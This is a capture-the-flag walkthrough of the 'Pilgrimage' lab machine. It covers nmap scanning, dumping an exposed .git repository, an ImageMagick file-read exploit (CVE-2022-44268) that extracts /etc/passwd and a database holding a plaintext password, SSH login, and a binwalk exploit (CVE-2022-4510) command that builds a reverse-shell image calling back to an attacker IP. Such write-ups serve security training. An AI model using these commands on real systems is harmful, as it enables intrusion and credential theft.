# Pilgrimage

As a first step I ran a quick scan with nmap on all available ports.

```
$ sudo nmap -sS -Pn --max-retries 1 --min-rate 20 -p- 10.10.11.219 
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-15 15:01 CEST
Warning: 10.10.11.219 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.11.219
Host is up (0.042s latency).
Not shown: 65294 closed tcp ports (reset), 239 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 62.74 seconds
```

The only two open ports are `22` and `80`, so I ran a scan that showed me the services open on those ports.

```
$ sudo nmap -sS -Pn -sV -sC -p 22,80 pilgrimage.htb    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-15 15:05 CEST
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)
|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)
|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Pilgrimage - Shrink Your Images
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Finally, I ran one last scan to check if there were any known vulnerabilities.

```
$ sudo nmap -sS -Pn --script vuln -p 22,80 pilgrimage.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-15 15:06 CEST
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.041s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=pilgrimage.htb
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://pilgrimage.htb:80/
|     Form id: filename
|     Form action: /
|     
|     Path: http://pilgrimage.htb:80/dashboard.php
|     Form id: 
|     Form action: /login.php
|     
|     Path: http://pilgrimage.htb:80/login.php
|     Form id: 
|     Form action: /login.php
|     
|     Path: http://pilgrimage.htb:80/logout.php
|     Form id: filename
|     Form action: /
|     
|     Path: http://pilgrimage.htb:80/register.php
|     Form id: 
|_    Form action: /register.php
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-fileupload-exploiter: ERROR: Script execution failed (use -d to debug)
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
| http-enum: 
|   /login.php: Possible admin folder
|_  /.git/HEAD: Git folder
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
```
The scripts found the visible php files that make up the site and highlighted the .git folder for me.
In my case, if I try to see the .git folder the site returns me a `403` code

* 403 Forbidden - `.git` exists, but I am not able to list the folder in that server.

It can be caused by directory listing disabling on the server, but if I know the name of the files in this folder I am able to download them.

I found a script on [github](https://github.com/arthaud/git-dumper) that works for me.

```
$ python -m pip install git-dumper
```
After installing it I ran the script giving it the URL of the .git folder to search in.

```
$ git-dumper http://pilgrimage.htb .git
[-] Testing http://pilgrimage.htb/.git/HEAD [200]
[-] Testing http://pilgrimage.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://pilgrimage.htb/.gitignore [404]
[-] http://pilgrimage.htb/.gitignore responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/post-receive.sample [404]
[-] http://pilgrimage.htb/.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/description [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/post-commit.sample [404]
[-] http://pilgrimage.htb/.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/index [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://pilgrimage.htb/.git/objects/info/packs [404]
[-] http://pilgrimage.htb/.git/objects/info/packs responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/hooks/update.sample [200]
[-] Fetching http://pilgrimage.htb/.git/info/exclude [200]
[-] Finding refs/
[-] Fetching http://pilgrimage.htb/.git/HEAD [200]
[-] Fetching http://pilgrimage.htb/.git/FETCH_HEAD [404]
[-] http://pilgrimage.htb/.git/FETCH_HEAD responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/logs/refs/heads/master [200]
[-] Fetching http://pilgrimage.htb/.git/info/refs [404]
[-] http://pilgrimage.htb/.git/info/refs responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/logs/HEAD [200]
[-] Fetching http://pilgrimage.htb/.git/logs/refs/remotes/origin/HEAD [404]
[-] http://pilgrimage.htb/.git/logs/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/config [200]
[-] Fetching http://pilgrimage.htb/.git/logs/refs/stash [404]
[-] Fetching http://pilgrimage.htb/.git/logs/refs/remotes/origin/master [404]
[-] http://pilgrimage.htb/.git/logs/refs/remotes/origin/master responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/ORIG_HEAD [404]
[-] http://pilgrimage.htb/.git/ORIG_HEAD responded with status code 404
[-] http://pilgrimage.htb/.git/logs/refs/stash responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/packed-refs [404]
[-] http://pilgrimage.htb/.git/packed-refs responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/heads/master [200]
[-] Fetching http://pilgrimage.htb/.git/refs/remotes/origin/HEAD [404]
[-] Fetching http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/master [404]
[-] http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/master responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/remotes/origin/master [404]
[-] Fetching http://pilgrimage.htb/.git/refs/stash [404]
[-] http://pilgrimage.htb/.git/refs/stash responded with status code 404
[-] http://pilgrimage.htb/.git/refs/remotes/origin/master responded with status code 404
[-] http://pilgrimage.htb/.git/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/wip/index/refs/heads/master [404]
[-] http://pilgrimage.htb/.git/refs/wip/index/refs/heads/master responded with status code 404
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://pilgrimage.htb/.git/objects/6c/965df00a57fd13ad50b5bbe0ae1746cdf6403d [200]
[-] Fetching http://pilgrimage.htb/.git/objects/e1/a40beebc7035212efdcb15476f9c994e3634a7 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/e9/2c0655b5ac3ec2bfbdd015294ddcbe054fb783 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/fa/175a75d40a7be5c3c5dee79b36f626de328f2e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/54/4d28df79fe7e6757328f7ecddf37a9aac17322 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/11/dbdd149e3a657bc59750b35e1136af861a579f [200]
[-] Fetching http://pilgrimage.htb/.git/objects/cd/2774e97bfe313f2ec2b8dc8285ec90688c5adb [200]
[-] Fetching http://pilgrimage.htb/.git/objects/76/a559577d4f759fff6af1249b4a277f352822d5 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/5f/ec5e0946296a0f09badeb08571519918c3da77 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/fd/90fe8e067b4e75012c097a088073dd1d3e75a4 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/fb/f9e44d80c149c822db0b575dbfdc4625744aa4 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c4/18930edec4da46019a1bac06ecb6ec6f7975bb [200]
[-] Fetching http://pilgrimage.htb/.git/objects/1f/8ddab827030fbc81b7cb4441ec4c9809a48bc1 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/2b/95e3c61cd8f7f0b7887a8151207b204d576e14 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/06/19fc1c747e6278bbd51a30de28b3fcccbd848a [200]
[-] Fetching http://pilgrimage.htb/.git/objects/00/00000000000000000000000000000000000000 [404]
[-] http://pilgrimage.htb/.git/objects/00/00000000000000000000000000000000000000 responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/objects/dc/446514835fe49994e27a1c2cf35c9e45916c71 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c2/a4c2fd4e5b2374c6e212d1800097e3b30ff4e2 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/b2/15e14bb4766deff4fb926e1aa080834935d348 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/96/3349e4f7a7a35c8f97043c20190efbe20d159a [200]
[-] Fetching http://pilgrimage.htb/.git/objects/47/6364752c5fa7ad9aa10f471dc955aac3d3cf34 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/b6/c438e8ba16336198c2e62fee337e126257b909 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/88/16d69710c5d2ee58db84afa5691495878f4ee1 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c4/3565452792f19d2cf2340266dbecb82f2a0571 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/b4/21518638bfb4725d72cc0980d8dcaf6074abe7 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/46/44c40a1f15a1eed9a8455e6ac2a0be29b5bf9e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/ff/dbd328a3efc5dad2a97be47e64d341d696576c [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c2/cbe0c97b6f3117d4ab516b423542e5fe7757bc [200]
[-] Fetching http://pilgrimage.htb/.git/objects/a5/29d883c76f026420aed8dbcbd4c245ed9a7c0b [200]
[-] Fetching http://pilgrimage.htb/.git/objects/8e/42bc52e73caeaef5e58ae0d9844579f8e1ae18 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c3/27c2362dd4f8eb980f6908c49f8ef014d19568 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/1f/2ef7cfabc9cf1d117d7a88f3a63cadbb40cca3 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/49/cd436cf92cc28645e5a8be4b1973683c95c537 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/f3/e708fd3c3689d0f437b2140e08997dbaff6212 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/f2/b67ac629e09e9143d201e9e7ba6a83ee02d66e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/2f/9156e434cfa6204c9d48733ee5c0d86a8a4e23 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/50/210eb2a1620ef4c4104c16ee7fac16a2c83987 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/93/ed6c0458c9a366473a6bcb919b1033f16e7a8d [200]
[-] Fetching http://pilgrimage.htb/.git/objects/36/c734d44fe952682020fd9762ee9329af51848d [200]
[-] Fetching http://pilgrimage.htb/.git/objects/8a/62aac3b8e9105766f3873443758b7ddf18d838 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/a7/3926e2965989a71725516555bcc1fe2c7d4f9e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/8f/155a75593279c9723a1b15e5624a304a174af2 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/9e/ace5d0e0c82bff5c93695ac485fe52348c855e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/98/10e80fba2c826a142e241d0f65a07ee580eaad [200]
[-] Fetching http://pilgrimage.htb/.git/objects/81/703757c43fe30d0f3c6157a1c20f0fea7331fc [200]
[-] Fetching http://pilgrimage.htb/.git/objects/26/8dbf75d02f0d622ac4ff9e402175eacbbaeddd [200]
[-] Fetching http://pilgrimage.htb/.git/objects/29/4ee966c8b135ea3e299b7ca49c450e78870b59 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/23/1150acdd01bbbef94dfb9da9f79476bfbb16fc [200]
[-] Fetching http://pilgrimage.htb/.git/objects/ca/d9dfca08306027b234ddc2166c838de9301487 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/f1/8fa9173e9f7c1b2f30f3d20c4a303e18d88548 [200]
[-] Running git checkout .
```
Thanks to this tool, I obtained the source code of the site.
```
$ cd .git
$ ll   
total 26960
drwxr-xr-x 6 kali kali     4096 Sep 20 10:52 assets
-rwxr-xr-x 1 kali kali     5538 Sep 20 10:52 dashboard.php
-rwxr-xr-x 1 kali kali     9250 Sep 20 10:52 index.php
-rwxr-xr-x 1 kali kali     6822 Sep 20 10:52 login.php
-rwxr-xr-x 1 kali kali       98 Sep 20 10:52 logout.php
-rwxr-xr-x 1 kali kali 27555008 Sep 20 10:52 magick
-rwxr-xr-x 1 kali kali     6836 Sep 20 10:52 register.php
drwxr-xr-x 4 kali kali     4096 Sep 20 10:52 vendor
```
In addition to the various php files, there is an executable called magick. I checked the version and searched the internet to see if there were any known vulnerabilities.

```
$ ./magick --version                            
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

### CVE-2022-44268

> ImageMagick 7.1.0-49 is vulnerable to Information Disclosure. When it parses a PNG image (e.g., for resize), the resulting image could have embedded the content of an arbitrary. file (if the magick binary has permissions to read it).

Thanks to this CVE I can read the files on the site by exploiting the vulnerability present in this version of ImageMagick. To do this I found an exploit written in Python on [github](https://github.com/kljunowsky/CVE-2022-44268/tree/7e17dc0473af52c9507b1995638ee60115941058) that is very simple to use.

```
$ python CVE-2022-44268.py --image owl.png --file-to-read /etc/passwd --output evil_owl.png
```
I modified a pre-existing image in such a way as to have the `/etc/passwd` file returned by the server. I uploaded it to the site using the form on the `dashboard.php` page and got the following link

* `http://pilgrimage.htb/shrunk/650adc2f4407b.png`

So I ran the second command, as described on the github repo and I obtained the `/etc/passwd` file present on the target machine.

```
$ python CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/650adc2f4407b.png            
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```
Well... now I know that there is a user named `emily` on the machine. I tried a bruteforce attack using `hydra` but it doesn't work...

Then I remembered that I have the source code of the site available, so I decided to check it and I discovered that in the files `index.php`, `login.php` and `register.php` there is a path to a sqlite3 file.

* login.php
```php
  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("SELECT * FROM users WHERE username = ? and password = ?");
  $stmt->execute(array($username,$password));
```

Using the exploit I found, I downloaded this file and opened it. But be careful, to make the exploit work I had to add the `errors='ignore'` argument inside the `decode` function.

```python
# Decrypt the raw profile type from hex format
decrypted_profile_type = bytes.fromhex(raw_profile_type_stipped).decode('utf-8', errors='ignore')
```
The errors were due to python failing to decode all the bytes correctly. Having ignored the errors, I was able to see the file but it is not formatted well, this is its contents.

```
e8|StableimagesimagesCREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL)+?indexsqlite_autoindex_images_1imagesf+tableusersusersCREATE TABLE users (username TEXT PRIMARY KEY NOT NULL, passwxf0passwordT NULL))=indexsqlite_autoindex_users_1users
           asdasd123▒-emilyabigchonkyboi123
@i#http://pilgrimage.htb/shrunk/650ad9bb2a36c.pngnophoto.pngxf0
1i      http://pilgrimage.htb/shrunk/650ad9bb2a36c.png
```

Since I know that the user on the machine is called emily, from here I can assume that the rest of the string next to the name emily is her password.

```
$ ssh emily@pilgrimage.htb
emily@pilgrimage.htb's password: 
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Sep 20 22:26:46 2023 from 10.10.14.77
emily@pilgrimage:~$
```
It works... after that I upload an run linpeas script on the machine and it found a file named `/usr/sbin/malwarescan.sh`

```
emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh 
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

Using the `top` command you can see that this script is continuously running with root permissions.

Checking the version of binwalk present on the machine I discovered that it is a version vulnerable to Remote Code Execution and that there is a specific CVE for it.


### CVE-2022-4510

> A path traversal vulnerability was identified in ReFirm Labs binwalk from version 2.1.2b through 2.3.3 included. By crafting a malicious PFS filesystem file, an attacker can get binwalk's PFS extractor to extract files at arbitrary locations when binwalk is run in extraction mode (-e option). Remote code execution can be achieved by building a PFS filesystem that, upon extraction, would extract a malicious binwalk module into the folder .config/binwalk/plugins. This vulnerability is associated with program files src/binwalk/plugins/unpfs.py. This issue affects binwalk from 2.1.2b through 2.3.3 included. 

I searched the internet and found an exploit on github that allows me to embed commands within images, so that they are executed by binwalk as soon as the images are uploaded to the server

```
$ python walkingpath.py reverse input.png 10.10.14.54 4444
```

The pdf report present in this repo describes in detail all the vulnerabilities found on this machine.